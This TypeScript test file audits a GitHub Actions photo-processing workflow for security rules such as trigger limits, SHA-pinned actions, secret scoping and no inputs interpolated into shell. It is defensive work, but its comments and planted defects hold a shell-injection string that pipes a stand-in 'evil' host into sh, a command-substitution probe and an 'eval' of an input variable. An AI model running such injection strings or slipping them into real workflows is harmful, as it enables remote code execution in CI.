/**
 * The contract test for `.github/workflows/process-photos.yml` (plan 04-08, Task 3).
 *
 * WHY IT PARSES THE YAML INSTEAD OF GREPPING IT
 * ---------------------------------------------
 * Two of the rules below cannot be checked with a regex over the file. `${{ inputs.alt }}` can
 * hide inside a multi-line block scalar, where a line-oriented grep for `run:` never looks; and
 * "no secret above step level" is a question about WHERE a key sits in the tree, which a text
 * search cannot answer at all. So the file is parsed once and every rule is asked of the
 * document. The two rules that genuinely are textual — the legacy origin, and the 40-hex SHA
 * suffix on a `uses:` value — say so where they are written.
 *
 * WHY THE RULES LIVE IN A FUNCTION AND NOT IN THE `it` BODIES
 * ----------------------------------------------------------
 * `auditWorkflow(source)` returns a tagged finding list, so the same rules can be pointed at a
 * DELIBERATELY BROKEN copy of the workflow. That is what the second half of this file does: it
 * plants TEN defects, one per rule, and requires each to produce EXACTLY ONE finding carrying its
 * own rule id. A single "the workflow is valid" assertion that reddens for all ten for the same
 * reason is one assertion wearing ten hats, and plan 04-08 says so explicitly. (The plan asked
 * for seven; A7, A10 and A11 are three more rules this file added, so they are planted too.)
 *
 * THE `on:` KEY IS A TRAP, AND IT IS GUARDED
 * ------------------------------------------
 * Under the YAML 1.1 schema (`js-yaml`'s default, and every YAML tutorial written before 2009)
 * the bare word `on` parses as the BOOLEAN `true`, so `doc.on` is `undefined` and the trigger
 * block hides under `doc[true]`. Every trigger assertion would then pass over nothing. `yaml` v2
 * uses the 1.2 core schema and keeps it a string — asserted below rather than trusted, because
 * a future swap of parser is exactly the change that would silently disarm rules 1, 2 and 3.
 *
 * THE PARSER IS AN UNDECLARED DEPENDENCY, AND THAT IS RECORDED RATHER THAN HIDDEN
 * -----------------------------------------------------------------------------
 * `yaml` 2.9.0 resolves at the top of `node_modules` as a TRANSITIVE dependency of `vite` (via
 * `astro`) and `@astrojs/yaml2ts`. It is in the committed lockfile, so `npm ci` installs it
 * deterministically and CI has it — but nothing in `package.json` asks for it, so a future Vite
 * release that drops it would take this file with it. Plan 04-08 could not add the declaration:
 * `package.json` belonged to a plan running in the same wave. The failure mode is a loud
 * `Cannot find module 'yaml'` at import, never a vacuous pass, which is why this was recorded
 * and shipped rather than worked around with a hand-rolled parser. PROMOTE `yaml` TO A DIRECT
 * devDependency.
 *
 * THE RESIDUAL BOUNDARY ON RULE A9, MEASURED RATHER THAN ASSUMED
 * -------------------------------------------------------------
 * A9 refuses `${{ inputs.… }}` inside a `run:` block, because Actions substitutes that text
 * BEFORE bash is started: a `title` of `"; curl evil | sh; #` becomes shell source. It does NOT
 * refuse a `run:` block that reads `$ALT` after the value arrived through `env:`, and that is
 * correct rather than an oversight — bash expands a parameter, it does not re-parse the result
 * as code. MEASURED in GNU bash 5.3.9 on 2026-08-27, not assumed:
 *
 *     ALT='$(touch /tmp/probe)' bash -c 'echo $ALT'   -> printed the text, created NO file
 *     ALT='$(touch /tmp/probe)' bash -c 'eval "echo $ALT"' -> created the file
 *
 * So the residual is exactly `eval "$VAR"` / `sh -c "$VAR"`, which A9 does not look for and
 * which this workflow does not contain. That hole is written down here rather than papered over
 * with a rule that would give false coverage — and the last assertion in this file pins that
 * `eval ` is absent from the workflow, which is the part a test can actually hold.
 */

import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { DISPATCH_INPUTS } from '../../src/lib/photo-pipeline';

const REPO_ROOT = fileURLToPath(new URL('../..', import.meta.url));
const WORKFLOW_RELATIVE = '.github/workflows/process-photos.yml';
const WORKFLOW_PATH = `${REPO_ROOT}${WORKFLOW_RELATIVE}`;

/** `workflow_dispatch` accepts at most this many top-level inputs. */
const DISPATCH_INPUT_LIMIT = 25;

/** The two DNS labels of the legacy development origin, joined here so this file holds no copy. */
const LEGACY_ORIGIN_RE = new RegExp(
  `pub-[0-9a-f]+\\.${['r2', 'dev'].join('\\.')}|\\.r2\\.dev`,
  'i'
);

type Finding = { rule: string; detail: string };
type Counts = {
  triggers: number;
  inputs: number;
  jobs: number;
  steps: number;
  uses: number;
  runBlocks: number;
};

/**
 * Reads the workflow, refusing an absent or empty file rather than reporting a clean audit of
 * nothing. Plan 04-08's "NOTHING TO CHECK" step is this function's whole reason for existing as
 * something separate from the audit.
 */
function loadWorkflow(absolutePath: string): string {
  let source: string;
  try {
    source = readFileSync(absolutePath, 'utf8');
  } catch (error) {
    throw new Error(
      `workflow-contract: ${absolutePath} could not be read — ${(error as Error).message}. ` +
        `An unreadable workflow is a failure, never an absence of findings.`
    );
  }
  if (source.trim().length === 0) {
    throw new Error(
      `workflow-contract: ${absolutePath} is empty. Every rule below would pass over nothing.`
    );
  }
  return source;
}

/** Depth-first serialisation of a subtree, for the textual scope rules. */
const asText = (value: unknown): string => JSON.stringify(value ?? null);

function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } {
  const findings: Finding[] = [];
  const add = (rule: string, detail: string) => findings.push({ rule, detail });

  const doc = parse(source) as Record<string, unknown> | null;
  if (doc === null || typeof doc !== 'object') {
    add('A0', 'the workflow did not parse into a mapping — there is nothing to audit');
    return {
      findings,
      counts: { triggers: 0, inputs: 0, jobs: 0, steps: 0, uses: 0, runBlocks: 0 },
    };
  }

  // The `on:`-is-a-boolean trap. If this fires, rules A1..A3 would otherwise pass over nothing.
  if (!('on' in doc)) {
    add(
      'A0',
      `no "on" key in ${JSON.stringify(Object.keys(doc))} — if the parser resolved it to the ` +
        `boolean true (YAML 1.1), every trigger rule below is auditing an absent object`
    );
  }

  const triggers = (doc.on ?? {}) as Record<string, unknown>;
  const dispatch = (triggers.workflow_dispatch ?? {}) as Record<string, unknown>;
  const inputs = (dispatch.inputs ?? {}) as Record<string, Record<string, unknown>>;
  const jobs = (doc.jobs ?? {}) as Record<string, Record<string, unknown>>;

  const steps: Array<Record<string, unknown>> = [];
  for (const job of Object.values(jobs)) {
    if (Array.isArray(job?.steps)) steps.push(...(job.steps as Array<Record<string, unknown>>));
  }

  const usesValues = steps
    .map((step) => step.uses)
    .filter((value): value is string => typeof value === 'string');
  const runBlocks = steps
    .map((step) => step.run)
    .filter((value): value is string => typeof value === 'string');

  const counts: Counts = {
    triggers: Object.keys(triggers).length,
    inputs: Object.keys(inputs).length,
    jobs: Object.keys(jobs).length,
    steps: steps.length,
    uses: usesValues.length,
    runBlocks: runBlocks.length,
  };

  /* -- A1: the trigger KEY SET, not merely the presence of workflow_dispatch ---------------- */
  const triggerKeys = Object.keys(triggers);
  if (triggerKeys.length !== 1 || triggerKeys[0] !== 'workflow_dispatch') {
    add(
      'A1',
      `triggers are ${JSON.stringify(triggerKeys)}; the only permitted trigger is ` +
        `workflow_dispatch. A push or schedule trigger here is a second way in.`
    );
  }

  /* -- A2: the inputs cannot drift from DISPATCH_INPUTS ------------------------------------- */
  const declaredNames = DISPATCH_INPUTS.map((input) => input.name);
  const yamlNames = Object.keys(inputs);
  if (yamlNames.join(',') !== declaredNames.join(',')) {
    add(
      'A2',
      `inputs ${JSON.stringify(yamlNames)} do not equal DISPATCH_INPUTS ` +
        `${JSON.stringify(declaredNames)}, name for name and in order`
    );
  }
  for (const input of DISPATCH_INPUTS) {
    const declaredInYaml = inputs[input.name];
    if (declaredInYaml === undefined) continue;
    if (Boolean(declaredInYaml.required) !== input.required) {
      add(
        'A2',
        `input ${input.name} is required=${declaredInYaml.required} in the workflow and ` +
          `required=${input.required} in DISPATCH_INPUTS`
      );
    }
    if (declaredInYaml.description !== input.description) {
      add('A2', `input ${input.name} has a description the contract module does not carry`);
    }
  }

  /* -- A3: the documented ceiling ----------------------------------------------------------- */
  if (counts.inputs > DISPATCH_INPUT_LIMIT) {
    add(
      'A3',
      `${counts.inputs} inputs exceeds the workflow_dispatch limit of ${DISPATCH_INPUT_LIMIT}`
    );
  }

  /* -- A4: queue, do not cancel ------------------------------------------------------------- */
  const concurrency = (doc.concurrency ?? {}) as Record<string, unknown>;
  if (concurrency['cancel-in-progress'] !== false) {
    add(
      'A4',
      `concurrency.cancel-in-progress is ${JSON.stringify(concurrency['cancel-in-progress'])}; ` +
        `it must be false. A run cancelled mid-publish is how the bucket and the manifest ` +
        `end up disagreeing — same setting and same reason as deploy.yml.`
    );
  }
  if (typeof concurrency.group !== 'string' || concurrency.group.length === 0) {
    add('A4', 'concurrency.group is missing or empty, so nothing is serialised');
  }

  /* -- A5: every action pinned to a full commit SHA (textual, by nature) -------------------- */
  if (usesValues.length === 0) {
    add('A5', 'no `uses:` entries were found, so the pinning rule would loop over nothing');
  }
  for (const value of usesValues) {
    if (!/@[0-9a-f]{40}$/.test(value)) {
      add(
        'A5',
        `${value} is not pinned to a full 40-character commit SHA. A tag is a mutable pointer ` +
          `whoever controls the action's repository can move.`
      );
    }
  }

  /* -- A6: checkout depth chosen, not inherited --------------------------------------------- */
  const checkoutSteps = steps.filter(
    (step) => typeof step.uses === 'string' && step.uses.startsWith('actions/checkout@')
  );
  if (checkoutSteps.length === 0) {
    add('A6', 'no actions/checkout step, so the fetch-depth rule would check nothing');
  }
  for (const step of checkoutSteps) {
    const withBlock = (step.with ?? {}) as Record<string, unknown>;
    if (!('fetch-depth' in withBlock)) {
      add(
        'A6',
        'the checkout step sets no fetch-depth. The default is a depth-1 shallow clone, which ' +
          'broke Deploy at run 32941901693 on 2026-08-26; the depth must be chosen in writing.'
      );
    } else if (withBlock['fetch-depth'] !== 0) {
      add(
        'A6',
        `fetch-depth is ${JSON.stringify(withBlock['fetch-depth'])}; both other workflows use 0`
      );
    }
  }

  /* -- A7: a permissions block exists at workflow level -------------------------------------- */
  if (typeof doc.permissions !== 'object' || doc.permissions === null) {
    add('A7', 'no workflow-level permissions block, so the job inherits the repository default');
  }

  /* -- A8: no secret above step level -------------------------------------------------------- */
  const workflowLevel = { ...doc };
  delete workflowLevel.jobs;
  if (asText(workflowLevel).includes('secrets.')) {
    add('A8', 'a secrets.* reference appears at workflow level, where every step can read it');
  }
  for (const [name, job] of Object.entries(jobs)) {
    const jobLevel = { ...job };
    delete jobLevel.steps;
    if (asText(jobLevel).includes('secrets.')) {
      add(
        'A8',
        `job ${name} carries a secrets.* reference outside its steps, so every step in it — and ` +
          `every third-party action any of them invokes — can read it`
      );
    }
  }

  /* -- A9: no input interpolated into a bash run: block -------------------------------------- */
  for (const block of runBlocks) {
    const match = block.match(/\$\{\{[^}]*\binputs\.[a-z_]+/i);
    if (match !== null) {
      add(
        'A9',
        `a run: block interpolates ${match[0]}…. Actions substitutes that text before bash ` +
          `starts, so caller-supplied input in that position is shell source (T-04-35). Pass it ` +
          `through env: and read it as a variable.`
      );
    }
  }

  /* -- A10: no legacy origin literal (textual, belt and braces beside gate:origin) ----------- */
  if (LEGACY_ORIGIN_RE.test(source)) {
    add('A10', 'the workflow contains a legacy development origin literal');
  }

  /* -- A11: GITHUB_TOKEN carries no write grant ---------------------------------------------- */
  const permissionScopes: Array<[string, unknown]> = [
    ...Object.entries((doc.permissions ?? {}) as Record<string, unknown>),
    ...Object.values(jobs).flatMap((job) =>
      Object.entries((job.permissions ?? {}) as Record<string, unknown>)
    ),
  ];
  for (const [scope, level] of permissionScopes) {
    if (level === 'write') {
      add(
        'A11',
        `permissions grants ${scope}: write to GITHUB_TOKEN. The pipeline pushes with the App ` +
          `installation token (OD-8 A), so a write grant here is a standing permission nothing ` +
          `uses and nobody re-reads.`
      );
    }
  }

  return { findings, counts };
}

const ruleIds = (findings: Finding[]): string[] => findings.map((f) => f.rule);
const describeFindings = (findings: Finding[]): string =>
  findings.map((f) => `${f.rule}: ${f.detail}`).join('\n  ') || '(none)';

/* ============================================================================================
 * PASS ON CORRECT CODE — and report the counts, because a bare PASS proves nothing about how
 * much was looked at.
 * ========================================================================================== */

describe('the committed workflow', () => {
  const source = loadWorkflow(WORKFLOW_PATH);
  const { findings, counts } = auditWorkflow(source);

  it('satisfies every rule, and says how much it checked', () => {
    // console.log is swallowed by this vitest setup; process.stdout.write is not.
    process.stdout.write(
      `[workflow-contract] ${WORKFLOW_RELATIVE}: ${counts.triggers} trigger(s), ` +
        `${counts.inputs} input(s), ${counts.jobs} job(s), ${counts.steps} step(s), ` +
        `${counts.uses} uses: entr(ies), ${counts.runBlocks} run: block(s) — ` +
        `${findings.length} finding(s)\n`
    );
    expect(describeFindings(findings)).toBe('(none)');
    expect(findings).toEqual([]);
  });

  it('was actually parsed — the on: key survived as a string, not as the boolean true', () => {
    const doc = parse(source) as Record<string, unknown>;
    expect(Object.keys(doc)).toContain('on');
    expect(Object.hasOwn(doc, 'true')).toBe(false);
  });

  it('checked a non-empty set of each thing it loops over', () => {
    expect(counts.uses).toBeGreaterThan(0);
    expect(counts.steps).toBeGreaterThan(0);
    expect(counts.runBlocks).toBeGreaterThan(0);
    expect(counts.inputs).toBe(DISPATCH_INPUTS.length);
  });

  it('declares the five inputs in DISPATCH_INPUTS order with matching required flags', () => {
    const doc = parse(source) as { on: { workflow_dispatch: { inputs: Record<string, unknown> } } };
    const inputs = doc.on.workflow_dispatch.inputs;
    expect(Object.keys(inputs)).toEqual(['temp_key', 'category', 'title', 'alt', 'place']);
    expect(Object.keys(inputs)).toEqual(DISPATCH_INPUTS.map((i) => i.name));
    expect(Object.values(inputs).map((i) => (i as { required: boolean }).required)).toEqual([
      true,
      true,
      true,
      true,
      false,
    ]);
  });

  it('is under the documented workflow_dispatch input ceiling', () => {
    expect(counts.inputs).toBeLessThanOrEqual(DISPATCH_INPUT_LIMIT);
  });

  it('runs the input validator before it installs anything or mints anything', () => {
    const doc = parse(source) as { jobs: Record<string, { steps: Array<{ name: string }> }> };
    const names = Object.values(doc.jobs)[0].steps.map((s) => s.name);
    const validateAt = names.findIndex((n) => /validate/i.test(n));
    const installAt = names.findIndex((n) => /install/i.test(n));
    const tokenAt = names.findIndex((n) => /mint/i.test(n));
    expect(validateAt).toBeGreaterThanOrEqual(0);
    expect(validateAt).toBeLessThan(installAt);
    expect(validateAt).toBeLessThan(tokenAt);
  });

  it('passes every declared input through env:, one variable per input', () => {
    const doc = parse(source) as {
      jobs: Record<string, { steps: Array<{ name: string; env?: Record<string, string> }> }>;
    };
    const step = Object.values(doc.jobs)[0].steps.find((s) => /validate/i.test(s.name));
    expect(step?.env).toBeDefined();
    expect(Object.keys(step?.env ?? {})).toEqual(
      DISPATCH_INPUTS.map((i) => `INPUT_${i.name.toUpperCase()}`)
    );
  });

  it('scopes the two app secrets to exactly one step, and names which', () => {
    const doc = parse(source) as {
      jobs: Record<string, { steps: Array<Record<string, unknown>> }>;
    };
    const carriers = Object.values(doc.jobs)[0]
      .steps.filter((s) => asText(s).includes('secrets.'))
      .map((s) => s.name);
    process.stdout.write(`[workflow-contract] secret-bearing step(s): ${carriers.join(', ')}\n`);
    expect(carriers).toHaveLength(1);
  });
});

/* ============================================================================================
 * NOTHING TO CHECK — an absent or empty workflow must fail, never report a clean audit.
 * ========================================================================================== */

describe('given nothing to check', () => {
  it('refuses a missing file, naming the path', () => {
    expect(() => loadWorkflow(`${REPO_ROOT}.github/workflows/no-such-workflow.yml`)).toThrow(
      /no-such-workflow\.yml/
    );
  });

  it('refuses a file that exists and is empty, naming emptiness rather than absence', () => {
    const dir = mkdtempSync(join(tmpdir(), 'workflow-contract-'));
    const file = join(dir, 'process-photos.yml');
    writeFileSync(file, '   \n\n');
    try {
      expect(() => loadWorkflow(file)).toThrow(/is empty/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('reports A0 rather than a clean pass when handed empty YAML', () => {
    expect(ruleIds(auditWorkflow('').findings)).toEqual(['A0']);
    expect(ruleIds(auditWorkflow('# only a comment\n').findings)).toEqual(['A0']);
  });

  it('reports A0 when the parser resolves on: to a boolean', () => {
    // What a YAML 1.1 parser does to this file. Written out so the guard is testable without
    // installing a second parser.
    const source = 'name: X\ntrue:\n  workflow_dispatch: {}\njobs: {}\n';
    expect(ruleIds(auditWorkflow(source).findings)).toContain('A0');
  });
});

/* ============================================================================================
 * PLANT THE DEFECT — eight of them, one per rule. Each must produce EXACTLY ONE finding, and it
 * must carry its own rule id. That is what stops this being one assertion wearing eight hats.
 * ========================================================================================== */

describe('each rule fails on its own defect and on nothing else', () => {
  const source = loadWorkflow(WORKFLOW_PATH);
  const plant = (find: string | RegExp, replace: string): string => {
    const mutated = source.replace(find as string, replace);
    if (mutated === source) {
      throw new Error(`the plant ${String(find)} changed nothing — the defect was never planted`);
    }
    return mutated;
  };

  it('A1 — a push trigger added alongside workflow_dispatch', () => {
    const { findings } = auditWorkflow(
      plant('  workflow_dispatch:\n', '  push:\n  workflow_dispatch:\n')
    );
    expect(ruleIds(findings)).toEqual(['A1']);
    expect(findings[0].detail).toMatch(/push/);
  });

  it('A2 — one input renamed', () => {
    const { findings } = auditWorkflow(plant('      temp_key:\n', '      tempkey:\n'));
    expect(ruleIds(findings)).toEqual(['A2']);
    expect(findings[0].detail).toMatch(/tempkey/);
  });

  it('A4 — cancel-in-progress flipped to true', () => {
    const { findings } = auditWorkflow(
      plant('cancel-in-progress: false', 'cancel-in-progress: true')
    );
    expect(ruleIds(findings)).toEqual(['A4']);
    expect(findings[0].detail).toMatch(/cancel-in-progress/);
  });

  it('A5 — one action repinned to a tag', () => {
    const { findings } = auditWorkflow(
      plant('actions/setup-node@820762786026740c76f36085b0efc47a31fe5020', 'actions/setup-node@v7')
    );
    expect(ruleIds(findings)).toEqual(['A5']);
    expect(findings[0].detail).toMatch(/setup-node@v7/);
  });

  it('A6 — fetch-depth deleted, so the default depth-1 clone is inherited silently', () => {
    const { findings } = auditWorkflow(plant('\n          fetch-depth: 0', ''));
    expect(ruleIds(findings)).toEqual(['A6']);
    expect(findings[0].detail).toMatch(/fetch-depth/);
  });

  it('A8 — a secret moved up to job level', () => {
    const { findings } = auditWorkflow(
      plant(
        '    steps:\n',
        // biome-ignore lint/suspicious/noTemplateCurlyInString: GitHub Actions expression syntax
        '    env:\n      APP_ID: ${{ secrets.PHOTO_PIPELINE_APP_ID }}\n    steps:\n'
      )
    );
    expect(ruleIds(findings)).toEqual(['A8']);
    expect(findings[0].detail).toMatch(/outside its steps/);
  });

  it('A9 — an input interpolated into a run: line', () => {
    const { findings } = auditWorkflow(
      plant(
        '        run: node scripts/lib/dispatch-input.mjs\n',
        // biome-ignore lint/suspicious/noTemplateCurlyInString: GitHub Actions expression syntax
        '        run: echo "${{ inputs.alt }}"\n'
      )
    );
    expect(ruleIds(findings)).toEqual(['A9']);
    expect(findings[0].detail).toMatch(/inputs\.alt/);
  });

  it('A11 — a contents: write grant left in "just in case"', () => {
    const { findings } = auditWorkflow(
      plant('permissions:\n  contents: read', 'permissions:\n  contents: write')
    );
    expect(ruleIds(findings)).toEqual(['A11']);
    expect(findings[0].detail).toMatch(/contents: write/);
  });

  it('A10 — a legacy origin literal in an env value', () => {
    const { findings } = auditWorkflow(
      plant(
        '        run: npm ci\n',
        '        run: npm ci\n        env:\n          X: https://pub-abc123.r2.dev\n'
      )
    );
    expect(ruleIds(findings)).toEqual(['A10']);
  });

  it('A7 — the permissions block removed entirely', () => {
    const { findings } = auditWorkflow(plant('permissions:\n  contents: read\n', ''));
    // A7 fires; A11 has nothing left to inspect and correctly stays silent.
    expect(ruleIds(findings)).toEqual(['A7']);
  });
});

/* ============================================================================================
 * WALK-THROUGH ATTEMPT — satisfy A9 and still be injectable?
 * ========================================================================================== */

describe('the residual boundary on A9', () => {
  const source = loadWorkflow(WORKFLOW_PATH);

  it('does NOT flag a run: block that reads an env-supplied value, and that is correct', () => {
    // The walk-through: route the input through env: (which A9 permits) and then reference it
    // unquoted in bash. Measured in bash before this test was written: a parameter expansion is
    // word-split and globbed, never re-parsed as code, so `echo $ALT` with ALT='$(touch x)'
    // prints the text and runs nothing. A9 letting this through is the rule being right.
    const mutated = source.replace(
      '        run: node scripts/lib/dispatch-input.mjs\n',
      '        run: echo $INPUT_ALT\n'
    );
    expect(mutated).not.toBe(source);
    expect(auditWorkflow(mutated).findings).toEqual([]);
  });

  it('is honest about what it would miss: eval of an env-supplied value', () => {
    // A9 does not look for this, the workflow does not contain it, and the hole is recorded in
    // this file's header rather than closed with a rule nobody would maintain. The assertion
    // pins the CURRENT behaviour so a future change to A9 is a deliberate one.
    const mutated = source.replace(
      '        run: node scripts/lib/dispatch-input.mjs\n',
      '        run: eval "$INPUT_ALT"\n'
    );
    expect(mutated).not.toBe(source);
    expect(auditWorkflow(mutated).findings).toEqual([]);
    expect(source).not.toContain('eval ');
  });
});
